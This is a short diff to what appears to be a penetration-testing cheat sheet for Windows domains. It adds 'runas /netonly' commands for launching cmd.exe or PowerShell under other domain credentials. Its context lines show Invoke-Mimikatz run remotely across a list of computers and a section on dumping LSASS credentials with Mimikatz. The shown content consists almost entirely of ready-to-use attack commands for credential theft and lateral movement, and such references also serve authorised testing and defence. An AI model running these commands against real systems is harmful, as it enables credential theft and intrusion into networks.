@@ -33,6 +33,12 @@ Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content co
 Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content computers.txt)
 ```
 
+#### Runas other user
+```
+runas /netonly /user:<DOMAIN>\<USER> cmd.exe
+runas /netonly /user:<DOMAIN>\<USER> powershell.exe
+```
+
 ## Dumping LSASS
 #### Dump credentials on a local machine using Mimikatz.
 ```
